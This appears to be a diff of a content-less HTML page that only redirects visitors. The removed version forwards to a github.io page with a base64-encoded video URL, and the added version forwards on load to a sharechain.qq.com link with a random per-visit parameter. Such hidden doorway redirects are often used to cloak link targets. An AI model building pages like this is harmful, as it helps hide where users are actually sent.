@@ -1,12 +1,22 @@
-<!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title></title>
+	<head>
+
+		<meta charset="utf-8" />
+      <title>.</title>
 </head>
+
 <body>
-<script>
-location.href="https://6531.github.io/1.html?u=aHR0cHM6Ly9kMjJ0cmY5MHk1Y2dzNi5jbG91ZGZyb250Lm5ldC91cGxvYWRzL3ZpZGVvLzM3Y2VlMTEzYjliZjRhNmQ4NzAxZmJiOGQzOWRiMjgyLm1wNA==";
-</script>
+
+    <script>
+        let button = document.querySelector('button')
+        const targetUrl = 'https://sharechain.qq.com/71990ee952f2f2469dbb2e2a8f432f27#';
+        const timestamp = Date.now();
+        const randomString = Math.random().toString(36).substring(2);
+        const urlWithParam = `${targetUrl}?timestamp=${timestamp}-${randomString}`;
+        window.onload = function () {
+            window.location.href = urlWithParam;
+        };
+    </script>
 </body>
+
 </html>
